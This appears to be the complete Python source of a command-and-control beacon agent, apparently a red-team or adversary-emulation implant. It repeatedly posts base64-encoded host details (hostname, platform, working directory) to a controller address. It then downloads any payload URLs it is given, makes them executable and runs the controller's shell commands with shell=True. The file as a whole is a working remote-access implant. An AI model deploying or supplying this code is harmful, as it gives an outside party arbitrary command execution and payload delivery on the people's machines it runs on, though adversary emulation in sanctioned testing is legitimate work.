import argparse
import base64
import json
import os
import socket
import subprocess
import stat
import sys
import time

import requests


class Executor:

    def run(self, i):
        i['pid'] = os.getpid()
        try:
            if i['Executor'] == 'sh':
                i['Response'] = self.bash(i)
            i['Status'] = 0
        except Exception as e:
            i['Response'] = str(e)
            i['Status'] = 1

    @staticmethod
    def bash(request):
        try:
            return subprocess.check_output(request['Request'], shell=True, timeout=120).decode('utf-8', errors='ignore')
        except subprocess.CalledProcessError as e:
            raise Exception(e.output)


class Beacon:

    def __init__(self, address, jitter):
        self.address = address
        self.jitter = jitter
        self.beacon = self._build_beacon(self.address)

    def monitor(self):
        while True:
            try:
                self.send(self.beacon)
                time.sleep(self.jitter)
            except Exception as e:
                print('[-] Something terribly wrong occurred %s' % e)

    def send(self, beacon):
        data = base64.urlsafe_b64encode(json.dumps(beacon).encode()).decode()
        res = requests.post(self.address, data=data)
        if res.text:
            instructions = json.loads(base64.b64decode(res.text))
            for i in instructions['links']:
                try:
                    if i['Payload']:
                        self._download_payload(name=i['Payload'].split('/')[-1], location=i['Payload'])
                    Executor().run(i)
                except Exception as e:
                    print('[-] Instruction failed: %s' % e)
            beacon = self._build_beacon(self.address, instructions['links'])
            self.send(beacon)

    @staticmethod
    def _build_beacon(target, links=[]):
        return dict(
            Name=socket.gethostname(),
            Location=__file__,
            Platform=sys.platform,
            Executors=['sh'],
            Range='dynamic',
            Pwd=os.getcwd(),
            Target=target,
            Links=links,
            Slepp=15,
        )

    @staticmethod
    def _download_payload(name, location):
        r = requests.get(location)
        with open(name, 'w') as fh:
            fh.write(r.content.decode('utf-8'))
        os.chmod(name, stat.S_IXUSR ^ stat.S_IRUSR ^ stat.S_IWUSR ^ stat.S_IRGRP ^ stat.S_IWGRP)


if __name__ == '__main__':
    parser = argparse.ArgumentParser('Start agent')
    parser.add_argument('-A', '--address', required=False, default='http://localhost:3391')
    parser.add_argument('-J', '--jitter', required=False, default=10)
    args = parser.parse_args()
    Beacon(args.address, args.jitter).monitor()
